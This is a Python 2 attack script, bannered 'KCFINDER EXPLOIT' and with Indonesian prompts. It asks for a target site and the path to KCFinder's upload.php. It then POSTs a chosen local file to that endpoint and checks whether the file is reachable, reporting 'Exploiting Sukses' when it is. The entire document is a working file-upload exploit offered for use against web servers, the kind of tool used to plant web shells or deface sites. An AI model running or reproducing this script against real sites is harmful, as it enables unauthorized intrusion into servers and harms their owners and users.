#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import os
import sys
import urllib
os.system("clear")


def banner():
    print("""
\033[95m####################
\033[95m#+-+-+-+-+-+-+-+-+-#
\033[95m# KCFINDER EXPLOIT #
\033[95m#+-+-+-+-+-+-+-+-+-#
\033[95m#################### \033[0m
""") 
def main():
    while True:
        print("\033[93mExample Url: target.co.li")
        print("\033[93mExample Path: /kcfinder/upload.php")
        print("\033[93mSesuaikan Dengan Path Target Anda")
        print("\033[93m------------------------------------")
        web = raw_input("\033[96m"+"Input Url: ")

        pat = raw_input("\033[96m"+"Input Path: ")
        sc = raw_input("\033[96m"+"Input File: ")
        if len(sc) > 0:
           if os.path.isfile(sc):
            scc = open(sc, 'r')
           else:
                os.system("clear")
                banner()
                print("\033[91m</> File Tidak Ditemukan </>")
                exit()    
        ex = 'http://'+web+pat
        os.system("clear") 
        banner()
        print("\033[94mExploiting . . . . ")
        try:
            files = {'file': scc}
            r = requests.post(ex, files=files) 
            cek = urllib.urlopen(ex+sc).getcode()
        except:
            print("</> Your Target Not Found </>")
            exit()
        if cek == 200:
            print("\033[92mExploiting Sukses")
            print("\033[92mCek di /kcfinder/browse.php")
        else:
            print("\033[91mExploiting Failed . . .") 
            exit()
        
if __name__ == "__main__":
    banner()
    main()               
